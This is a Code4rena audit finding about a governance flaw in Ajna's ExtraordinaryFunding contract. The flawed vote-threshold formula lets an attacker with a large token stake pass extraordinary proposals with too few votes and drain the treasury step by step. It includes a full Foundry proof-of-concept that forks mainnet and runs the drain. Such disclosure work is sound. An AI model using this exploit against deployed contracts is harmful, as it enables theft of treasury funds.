## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- M-12

# [Governance attack on Extraordinary Proposals](https://github.com/code-423n4/2023-05-ajna-findings/issues/164) 

# Lines of code

https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L173


# Vulnerability details

## Impact

The mechanics for Extraordinary proposals are simple and robust for attacks. There is a variable that is called Minimum Threshold (MT). The maximum amount of treasury tokens that can be requested on a proposal is bounded by MT. Basically, you can request any amount of tokens up to a maximum percentage of (1 - MT).

For a proposal to succeed, it needs a percentage of non-treasury tokens equal or greater than:

`MT + percentage of treasury tokens requested`

Quoting the whitepaper:

```
a. A proposer requests tokens equivalent to 10% of the treasury
   i. 50% + 10% = 60%
   ii. If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released
   iii. If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released
```

For example, if you want to request the max percentage of treasury tokens, that is `1 - MT`, the proposal will need `(1 - MT) + MT` percentage of non-treasury tokens, it means 100%. Note that I am not giving a specific value for `MT`, so this should hold for any extraordinary proposal, even when the value of `MT` changes. The design is correct, but the implementation is not. The implementation of the constraint of votes needed for a proposal is implemented as follows:

`votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage)`

To see where is the mistake we must convert the above formula into percentages, so we can compared it with what is written in the whitepaper. We know that `votesReceived` is some percentage (P1) of Non-treasury tokens, `tokensRequested` is some percentage (P2) of treasury tokens and `_getSliceOfNonTreasury(minThresholdPercentage)` is some percentage (P3) of Non-treasury tokens.

We also know that P2 is bounded by the minimum threshold, because we want to test the case where the maximum is requested then P2 becomes `(1 - MT)` and we know that P3 is `MT`. Re-writing:

`(P1)(NonTreasuryT) = (1 - MT)(TreasuryT) + (MT)(NonTreasuryT)`

I changed `>=` for `=` because I am interested on the minimum votes needed. Divide by `NonTreasuryT`, rewrite:

`P1 = ((1 - MT)(TreasuryT) / (NonTreasuryT)) + MT`

Now we have the formula re-written in terms of percentages, where we can see that `1 - MT` which is the percentage of requested treasury tokens is multiplied by the division of `TreasuryT / NonTreasuryT`. This has the consequence of reducing `1 - MT` since `NonTreasuryT` will be greater than `TreasuryT`. For example, let's take the case where the 1st proposal request the maximum amount of treasury tokens, that is, 50%.

`P1 = ((50%)(TreasuryT) / (NonTreasuryT)) + 50%`

Is clearly to see that P1 will be smaller than 100% (in the case where TreasuryT < NonTreasuryT), violating the design described on the whitepaper.

The proof of concept presented below is a scenario based on a total supply of 1B tokens, and a treasury of 300M tokens. In this scenario:

`P1 = ((50%)(300M) / (700M)) + 50% == 71.4%`

If we want to request again the maximum treasury tokens on the second proposal we will need:

`P1 = ((45%)(150M) / (850M)) + 55% == 62.94%`

We see a reduction on the percentage of non-treasury tokens needed between proposals, which should not happen, remember than on the design described on the whitepaper a proposal always need 100% of non treasury tokens when requesting the max amount of treasury tokens, no mattering the value of `MT`.

The PoC shows a possible scenario where an attacker can take advantage of this mistake that will allow him to drain the treasury if he manages to execute the first proposal.

The PoC is based on the assumption that the attacker manages to get a big portion (385M out of 700 non treasury tokens) of ajna tokens and convince other holders (115M of tokens) to vote (or delegate to him) for his proposal requesting the 50% of the treasury. If the attacker manages to achieve this, then he can drain the treasury alone, using the next proposals (because of the reduction of the percentage needed), even without the help of the previous holders.

## Proof of Concept

1.- Create a file under `test/unit/` and call it `ExploitEF.t.sol`

2.- Copy and paste the following:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import { GrantFund }             from "../../src/grants/GrantFund.sol";
import { IExtraordinaryFunding } from "../../src/grants/interfaces/IExtraordinaryFunding.sol";
import { IFunding }              from "../../src/grants/interfaces/IFunding.sol";
import { GrantFundTestHelper }   from "../utils/GrantFundTestHelper.sol";
import { IAjnaToken }            from "../utils/IAjnaToken.sol";
import { DrainGrantFund }        from "../interactions/DrainGrantFund.sol";

contract ExploitEF is GrantFundTestHelper {

    IAjnaToken        internal  _token;
    GrantFund         internal  _grantFund;

    // Ajna token Holder at the Ajna contract creation on mainnet
    address internal _tokenDeployer  = 0x666cf594fB18622e1ddB91468309a7E194ccb799;
    address internal _attacker   = makeAddr("_tokenHolder1");
    address internal _tokenHolder2   = makeAddr("_tokenHolder2");
    address internal _tokenHolder3   = makeAddr("_tokenHolder3");
    address internal _tokenHolder4   = makeAddr("_tokenHolder4");
    address internal _tokenHolder5   = makeAddr("_tokenHolder5");
    address internal _tokenHolder6   = makeAddr("_tokenHolder6");

    address[] internal _votersArrAttacker = [
        _attacker
    ];

    address[] internal _votersArr = [
        _tokenHolder2,
        _tokenHolder3,
        _tokenHolder4,
        _tokenHolder5,
        _tokenHolder6
    ];

    address[] internal _helperAttackerDelegatee = [
      _attacker,
      _attacker,
      _attacker,
      _attacker,
      _attacker
    ];

    // at this block on mainnet, all ajna tokens belongs to _tokenDeployer
    uint256 internal _startBlock      = 16354861;
    // at this block on mainnet, 1B ajna tokens where burned, reducing the supply to 1B.
    uint256 internal _startBlock2      = 16478160;

    function setUp() external {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/V2bjD46crGUhn4EDk92txmvC0BFqLzjo", _startBlock2);

        vm.startPrank(_tokenDeployer);

        // Ajna Token contract address on mainnet
        _token = IAjnaToken(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079);

        // deploy growth fund contract
        _grantFund = new GrantFund();

        // initial minter distributes tokens to test addresses
        _transferAjnaTokens(_token, _votersArrAttacker, 385_000_000 * 1e18, _tokenDeployer);
        _transferAjnaTokens(_token, _votersArr, 23_000_000 * 1e18, _tokenDeployer);

        // initial minter distributes treasury to grantFund
        // A treasury with 300M ajna tokens (Using whitepaper values)
        changePrank(_tokenDeployer);
        _token.approve(address(_grantFund), 300_000_000 * 1e18);
        _grantFund.fundTreasury(300_000_000 * 1e18);
    }    

    function test_drainTreasury() external {
      /*
        STATUS:

        - Attacker has 385M of ajna tokens
        - Holders from 2 to 6 have 23M of ajna tokens each, total of = 115M
        - TotalSupply is 1B ajna tokens.
        - Treasury is 300M ajna tokens
        - Non-Treasury tokens are 700M tokens
      */
      assertEq(_token.balanceOf(_attacker), 385_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);
      assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);
      assertEq(_grantFund.treasury(), 300_000_000 * 1e18);
      assertEq(_grantFund.getSliceOfNonTreasury(1e18), 700_000_000 * 1e18);

      // Attacker self delegates
      _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);
      // All holders delegate their tokens to the attacker.
      _delegateTo(_token, _votersArr, _helperAttackerDelegatee);

      vm.roll(_startBlock2 + 100);

      // set proposal params
      uint256 endBlockParam = block.number + 100_000;
       // 150M tokens requested, that is 50% of treasury
      uint256 tokensRequestedParam = 150_000_000 * 1e18;

      // generate proposal targets
      address[] memory targets = new address[](1);
      targets[0] = address(_token);

      // generate proposal values
      uint256[] memory values = new uint256[](1);
      values[0] = 0;

      // generate proposal calldata
      bytes[] memory calldatas = new bytes[](1);
      calldatas[0] = abi.encodeWithSignature(
        "transfer(address,uint256)",
        _attacker,
        tokensRequestedParam
      );

      // create and submit proposal
      TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(
        _grantFund,
        _attacker,
        endBlockParam,
        targets,
        values,
        calldatas,
        "We are requesting 50% of the treasury since this is a super important and big development for the ecosystem"
      );

      // Attacker has 500M of voting power which is ~ 71.4% of Non-Treasury Tokens
      uint256 attackerVotingPowerForEP = _grantFund.getVotesExtraordinary(_attacker, testProposal.proposalId);
      assertEq(attackerVotingPowerForEP, 500_000_000 * 1e18);

      changePrank(_attacker);
      _grantFund.voteExtraordinary(testProposal.proposalId);

      // Proposal state is Succeeded with only a 500M voting power.
      // Attacker was able to request 50% of treasury with only 71.4% of the Non-treasury tokens.
      // Whitepaper says that in order to request 50% of tokens (1st proposal, so Minium Threshold equals 50%), 
      // the proposal will need 50% + 50% = 100% of Non-Treasury tokens. Which here is demostrated that you only need 71.4%.
      IFunding.ProposalState proposalState = _grantFund.state(testProposal.proposalId);
      assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Succeeded));

      // execute proposal
      _grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(testProposal.description)));

      /*
        Status after the 1st proposal success:

        - Attacker has 535M of ajna tokens
        - Holders from 2 to 6 have 23M of ajna tokens each, total of = 125M
        - TotalSupply is 1B ajna tokens.
        - Treasury is 150M ajna tokens
        - Non-Treasury tokens are 850M tokens
      */
      assertEq(_token.balanceOf(_attacker), 535_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);
      assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);
      assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);
      assertEq(_grantFund.treasury(), 150_000_000 * 1e18);
      assertEq(_grantFund.getSliceOfNonTreasury(1e18), 850_000_000 * 1e18);

      /*
        After the 1st proposal has succeed, the attacker now can drain the treasury alone, without the previous delegators.

        This happens because the formula actually makes it easier to execute further extraordinary proposals.

        For example the previous proposal required 71.4% of non-treasury tokens to pass a proposal of 50% of treasury tokens.

        I will show how the second proposal will only require 62.94% of non-treasury tokens to pass a proposal of 45% of treasury tokens.
        Which is a slightly increase from 500M needed to 535M needed, that is only a 7% difficulty increase. Whereas the attacker increased his
        voting power from 385M to 535M (thanks to proposal 1) which is a 39% increase in his voting power.
      */

      // Holders now delegates for them
      _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);
      _delegateTo(_token, _votersArr, _votersArr);
      

      vm.roll(_startBlock2 + 500);

      // set proposal params
      uint256 endBlockParam2 = block.number + 100_000;
       // 67.5 tokens requested, that is 45% of treasury
      uint256 tokensRequestedParam2 = 67_500_000 * 1e18;

      // generate proposal targets
      address[] memory targets2 = new address[](1);
      targets2[0] = address(_token);

      // generate proposal values
      uint256[] memory values2 = new uint256[](1);
      values2[0] = 0;

      // generate proposal calldata
      bytes[] memory calldatas2 = new bytes[](1);
      calldatas2[0] = abi.encodeWithSignature(
        "transfer(address,uint256)",
        _attacker,
        tokensRequestedParam2
      );

      // create and submit proposal
      TestProposalExtraordinary memory testProposal2 = _createProposalExtraordinary(
        _grantFund,
        _attacker,
        endBlockParam2,
        targets2,
        values2,
        calldatas2,
        "Thanks for proposal 1, now I will drain the treasury"
      );

      // Attacker has 535M of voting power which is ~ 62.94% of Non-Treasury Tokens
      uint256 attackerVotingPowerForEP2 = _grantFund.getVotesExtraordinary(_attacker, testProposal2.proposalId);
      assertEq(attackerVotingPowerForEP2, 535_000_000 * 1e18);

       changePrank(_attacker);
      _grantFund.voteExtraordinary(testProposal2.proposalId);

      // Attacher succeed
      IFunding.ProposalState proposalState2 = _grantFund.state(testProposal2.proposalId);
      assertEq(uint8(proposalState2), uint8(IFunding.ProposalState.Succeeded));

      // execute proposal
      _grantFund.executeExtraordinary(targets2, values2, calldatas2, keccak256(bytes(testProposal2.description)));

      // Attacker balance is now 602.5M
      assertEq(_token.balanceOf(_attacker), 602_500_000 * 1e18);

      // The attacker can continue requesting (1- MiniumThreshold)% of the treasury until threshold becomes 100%.
    }

    function _delegateToDelegatees(IAjnaToken token_, address delegator_, address delegatee_) internal {
        changePrank(delegator_);
        token_.delegate(delegatee_);
    }

    function _delegateTo(IAjnaToken token_, address[] memory delegators_, address[] memory delegatees_) internal {
        for (uint256 i = 0; i < delegators_.length; ++i) {
            _delegateToDelegatees(token_, delegators_[i], delegatees_[i]);
        }
    }
}
```

3.- Run `forge test --match-contract ExploitEF --match-test test_drainTreasury` 

## Tools Used

Manual Review

## Recommended Mitigation Steps

Re-write the constraint as follows:

`votesReceived >= _getSliceOfNonTreasury(percentageOfTreasuryTokensRequested) + _getSliceOfNonTreasury(minThresholdPercentage)`















## Assessed type

Governance